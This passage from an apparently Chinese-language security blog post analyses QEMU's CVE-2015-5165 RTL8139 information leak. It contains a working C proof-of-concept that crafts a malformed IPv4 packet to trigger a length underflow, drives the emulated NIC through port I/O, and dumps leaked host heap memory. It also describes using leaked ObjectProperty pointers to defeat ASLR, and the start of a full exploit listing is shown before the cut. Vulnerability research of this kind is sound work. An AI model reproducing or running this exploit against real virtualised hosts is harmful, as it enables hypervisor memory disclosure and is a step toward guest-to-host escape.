class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// SRC MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// Length / Type: IPv4</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Ethernet Frame Payload æ•°æ®, å³ IPv4 æ•°æ®åŒ…</span></span><br><span class="line">    <span class="comment">// Version &amp; IHL(Internet Header Length)</span></span><br><span class="line">    (<span class="number">0x04</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x05</span>,    <span class="comment">// 0x05 * 4 = 20 bytes</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Total Length = 0x13 = 19 bytes</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,     <span class="comment">// 19 - 20 = -1 = 0xFFFF, trigger vulnerability</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Identification</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,     <span class="comment">// Flags &amp; Fragment Offset</span></span><br><span class="line">    <span class="number">0x40</span>,           <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x06</span>,           <span class="comment">// Protocol: TCP</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Header checksum</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Source IP: 127.0.0.1</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Destination IP: 127.0.0.1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IP Packet Payload æ•°æ®, å³ TCP æ•°æ®åŒ…</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Source Port</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,     <span class="comment">// Destination Port</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x50</span>,           <span class="comment">// 01010000, Header Length = 5 * 4 = 20</span></span><br><span class="line">    <span class="number">0x10</span>,           <span class="comment">// 00010000, ACK</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Window Size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>      <span class="comment">// Urgent Pointer</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(addr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring* ring, rtl8139_desc* desc, <span class="keyword">size_t</span> nb)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        </span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// descriptor owned by NIC å‡†å¤‡æ¥æ”¶æ•°æ®</span></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        <span class="keyword">if</span> (i == nb - <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            ring[i].desc-&gt;dw0 |= CP_RX_EOR; <span class="comment">// End of Ring</span></span><br><span class="line">        &#125;</span><br><span class="line">        ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;   <span class="comment">// buffer_size</span></span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Rx descriptors address</span></span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc* desc, <span class="keyword">void</span>* buffer)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN |    <span class="comment">// descriptor owned by NIC å‡†å¤‡å‘é€æ•°æ®</span></span><br><span class="line">                 CP_TX_EOR |</span><br><span class="line">                 CP_TX_LS |</span><br><span class="line">                 CP_TX_LGSEN |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS;</span><br><span class="line">    desc-&gt;dw0 += RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// è§¦å‘æ¼æ´éœ€è¦è®¾ç½®çš„ä¸€äº›å‚æ•°</span></span><br><span class="line">    outl(TxLoopBack, RTL8139_PORT + TxConfig);</span><br><span class="line">    outl(AcceptMyPhys, RTL8139_PORT + RxConfig);</span><br><span class="line">    outw(CPlusRxEnb | CPlusTxEnb, RTL8139_PORT + CpCmd);</span><br><span class="line">    outb(CmdRxEnb | CmdTxEnb, RTL8139_PORT + ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span>* buffer, <span class="keyword">void</span>* packet, <span class="keyword">size_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        outb(CPlus, RTL8139_PORT + TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span>* ptr, <span class="keyword">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n0x%08x: "</span>, ptr + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x "</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"- "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616</span></span><br><span class="line">    <span class="comment">// å¯ä»¥æ”¶å®Œ 65535 å­—èŠ‚æ•°æ®</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_ring));</span><br><span class="line">    rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    <span class="keyword">void</span>* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// change I/O privilege level</span></span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize Rx ring, Rx descriptor, Tx descriptor</span></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, </span><br><span class="line">                        <span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// print leaked data</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// RTL8139_BUFFER_SIZE ä¹‹å 4 å­—èŠ‚æ•°æ®ä¸º Checksum</span></span><br><span class="line">        <span class="comment">// ä¸æ‰“å°ä¹Ÿæ— æ‰€è°“äº†</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span>*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> free heap blocks</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œ PoC åï¼Œåœ¨æ¥æ”¶åˆ°çš„ä¸­é—´æŸäº›æ•°æ®åŒ…ä¸­å¯ä»¥çœ‹åˆ°æ³„éœ²çš„æ•°æ®ï¼š</p><p><img src="/uploads/202006/cve-2015-5165-poc.png" alt="QEMU æ¼æ´ CVE-2015-5165 PoC"></p><h3 id="4-5-æ¼æ´åˆ©ç”¨"><a href="#4-5-æ¼æ´åˆ©ç”¨" class="headerlink" title="4.5 æ¼æ´åˆ©ç”¨"></a>4.5 æ¼æ´åˆ©ç”¨</h3><p>Phrack æ–‡ç«  [1] æ¼æ´åˆ©ç”¨çš„æ€è·¯ä¸ºï¼šåœ¨æ³„éœ²çš„æ•°æ®ä¸­æœç´¢ä¿å­˜äº† <code>ObjectProperty</code> å¯¹è±¡çš„å †å—ï¼ˆå¯èƒ½æ˜¯å·²ç»è¢«é‡Šæ”¾çš„å †å—ï¼‰ï¼Œé€šè¿‡è¯»å– <code>ObjectProperty</code> å¯¹è±¡ä¸­ä¿å­˜çš„å‡½æ•°æŒ‡é’ˆæ¥æ³„éœ²æ¨¡å— <code>qemu-system-x86_64</code> çš„åŸºåœ°å€ã€‚</p><p>ç»“æ„ä½“ <code>ObjectProperty</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Q_TAILQ_ENTRY(type, qual)                               \</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span>                                                        \</span><br><span class="line">    qual type *tqe_next;        <span class="comment">/* next element */</span>              \</span><br><span class="line">    qual type *qual *tqe_prev;  <span class="comment">/* address of previous next element */</span>\</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTAILQ_ENTRY(type)       Q_TAILQ_ENTRY(struct type,)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectProperty</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    gchar *name;</span><br><span class="line">    gchar *type;</span><br><span class="line">    gchar *description;</span><br><span class="line">    ObjectPropertyAccessor *get;</span><br><span class="line">    ObjectPropertyAccessor *<span class="built_in">set</span>;</span><br><span class="line">    ObjectPropertyResolve *resolve;</span><br><span class="line">    ObjectPropertyRelease *release;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line"></span><br><span class="line">    QTAILQ_ENTRY(ObjectProperty) node;</span><br><span class="line">&#125; ObjectProperty;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ <code>get / set / resolve / release</code> ä¿å­˜çš„å€¼å‡ä¸ºå‡½æ•°æŒ‡é’ˆã€‚</p><p><strong>åˆ©ç”¨æ­¥éª¤ï¼š</strong></p><ol><li>ç»“æ„ä½“ <code>ObjectProperty</code> çš„å¤§å°ä¸º <code>0x50</code> å­—èŠ‚ï¼Œå› æ­¤åŒ…å« metadata çš„å †å—çš„å¤§å°ä¸º <code>0x60</code> å­—èŠ‚ï¼Œå¯ä»¥æ ¹æ®è¿™ä¸€ä¿¡æ¯å»æœç´¢æ³„éœ²çš„æ•°æ®ä¸­å­˜åœ¨çš„å †å—ï¼›</li><li>ASLR ä¸ä¼šå¯¹åœ°å€çš„ä½ <code>12</code> ä½è¿›è¡ŒéšæœºåŒ–å¤„ç†ï¼Œå› æ­¤å¯ä»¥ä»¥ç›¸å…³å‡½æ•°åœ°å€çš„ä½ <code>12</code> ä½ä¸ºç‰¹å¾è¿›è¡Œæœç´¢ï¼Œä»¥è®¡ç®—å‡ºæ¨¡å— <code>qemu-system-x86_64</code> çš„åŸºåœ°å€;</li><li>ç»Ÿè®¡æ³„éœ²çš„æ•°æ®ä¸­å‡ºç°çš„ <code>uint64_t</code> ç±»å‹çš„æ•°æ® <code>0x00007FXXYYZZZZZZ</code> ï¼Œå…¶ä¸­ <code>7FXXYY</code> å‡ºç°æ¬¡æ•°æœ€å¤šçš„æ•°æ®ï¼Œå°±æ˜¯ QEMU è™šæ‹Ÿæœºç‰©ç†å†…å­˜çš„ç»“æŸåœ°å€ï¼›</li></ol><p>åŸºäºå‰é¢çš„ PoC ä»£ç ï¼Œç¬”è€…é‡å†™çš„ä¸€ä»½ç”¨äºæµ‹è¯• CVE-2015-5165 çš„å®Œæ•´ Exploit ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é¡µé¢ç›¸å…³å‚æ•°</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame å¤§å°</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 ç½‘å¡ PMIO åœ°å€</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_PORT 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// w0 end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// Rx buffer size mask è¡¨ç¤º 0 ~ 12 ä½ä¸º buffer size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// Tx end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// last segment of received packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">// large send packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">// IP 